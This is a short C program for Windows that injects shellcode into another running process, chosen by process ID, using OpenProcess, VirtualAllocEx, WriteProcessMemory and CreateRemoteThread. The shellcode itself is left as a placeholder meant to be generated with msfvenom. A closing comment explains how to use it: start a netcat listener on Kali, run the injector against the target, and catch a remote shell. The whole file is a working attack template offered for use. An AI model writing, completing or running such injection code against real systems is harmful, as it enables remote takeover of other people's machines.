#include "stdafx.h"
#include "Windows.h"

int main(int argc, char *argv[]) {
  unsigned char payload[] = "payload from msfvenom"

  HANDLE processHandle;
  HANDLE remoteThread;
  PVOID remoteBuffer;

  printf("Injecting to PID process: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof payload,(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(processHandle, remoteBuffer, payload, sizeof payload, NULL);
  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);

  return 0;
}

/* Kali "nc -lvvp "port from payload"
   Win cmd "injection_process №PID" -> ENTER 
   
   Kali shell :-) */
